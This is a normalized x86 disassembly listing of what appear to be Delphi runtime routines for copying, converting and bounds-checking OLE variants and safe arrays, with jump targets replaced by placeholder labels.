call sub_40f054
jmp r-xdata
push ebx
call VariantClear
call sub_40ee9c
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40f268
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40f298
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40f298
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f2f4
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee9c
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40ee9c
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40f24c
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40ebf4
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40ee9c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40ee9c
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40f268
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40f298
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee9c
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40ee9c
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f4c8
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40f1d0
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee9c
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404100
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_414760
test al al
je r-xdata
mov ecx sub_40f4c0
mov edx esi
mov eax ebx
call sub_40f2f4
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40ee9c
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f574
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f4c8
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40f1d0
sub_40f5b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f614
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f574
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f840
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f61b
lea eax [ ebp - 0x10 ]
call sub_40f24c
retn
sub_40f624
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f662
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412c8c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41363c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f669
lea eax [ ebp - 0x4 ]
call sub_4047b8
retn
sub_40f670
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f6ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412564
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f6b5
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40f6bc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f6fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413330
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4136a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f701
lea eax [ ebp - 0x4 ]
call sub_405944
retn
sub_40f708
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f746
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_413264
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f74d
lea eax [ ebp - 0x4 ]
call sub_405944
retn
sub_40f754
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f840
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40eea8
jmp r-xdata
mov edx esi
call sub_40ea14
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40eea8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f7d4
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_414760
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f5b8
jmp r-xdata
mov edx esp
mov eax esi
call sub_414760
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f754
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f840
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f574
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f840
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f885 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f670
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40efb4
jmp r-xdata
mov eax ebx
call sub_4101ac
mov edx eax
mov eax esi
call sub_4134b8
jmp r-xdata
mov eax ebx
call sub_40fc04
mov edx eax
mov eax esi
call sub_413418
jmp r-xdata
mov eax ebx
call sub_411570
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413504
jmp r-xdata
mov eax ebx
call sub_4111d8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413528
jmp r-xdata
mov eax ebx
call sub_411eb0
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413554
jmp r-xdata
mov eax ebx
call sub_411948
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413580
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f624
jmp r-xdata
mov eax ebx
call sub_410cc4
mov edx eax
mov eax esi
call sub_4135ac
jmp r-xdata
mov eax ebx
call sub_410054
mov edx eax
mov eax esi
call sub_413498
jmp r-xdata
mov eax ebx
call sub_410104
mov edx eax
mov eax esi
call sub_413438
jmp r-xdata
mov eax ebx
call sub_4102a4
mov edx eax
mov eax esi
call sub_413458
jmp r-xdata
mov eax ebx
call sub_41037c
mov edx eax
mov eax esi
call sub_413478
jmp r-xdata
mov eax ebx
call sub_4106c8
push edx
push eax
mov eax esi
call sub_4134d8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f6bc
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f708
jmp r-xdata
mov dx 0x101
call sub_40ea14
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f24c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f7d4
xor edx edx
mov ax 0x1
call sub_40ea14
jmp r-xdata
sub_40fa6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fb0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412c8c
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404334
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408418
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb16
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
call sub_4047b8
retn
mov eax ebx
call sub_410cc4
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40eea8
jmp r-xdata
sub_40fb20
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40eea8
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fb5c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fbb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f574
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fc04
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fbb7
lea eax [ ebp - 0x14 ]
call sub_40f24c
retn
sub_40fbc0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414760
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fc04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410025
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fc37 ]
mov eax [ ebp - 0x4 ]
call sub_40fa6c
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa6c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fc04
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fb20
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fb5c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40ea14
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fbc0
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fb20
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40fb20
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fe5b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402abc
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fa6c
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fc04
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4031f0
sub_410054
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40ea14
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4100e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fc04
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031f0
sub_410104
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40ea14
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_410187
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fc04
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031f0
sub_4101ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410280
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fc04
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4101d2 ]
jmp [ eax * 4 + jump_table_4101e4 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031f0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40ea14
sub_4102a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_410359
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fc04
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4102c6 ]
jmp [ eax * 4 + jump_table_4102d9 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031f0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40ea14
sub_41037c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_410441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4106c8
test edx edx
je r-xdata
mov al [ eax + lookup_table_4103a2 ]
jmp [ eax * 4 + jump_table_4103b6 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4031f0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40ea14
sub_410464
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402abc
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40eea8
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410cc4
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_410510
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4105fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c8c
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404334
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408438
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410605
lea eax [ ebp - 0x1c ]
call sub_4040ac
lea eax [ ebp - 0xc ]
call sub_4047b8
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402abc
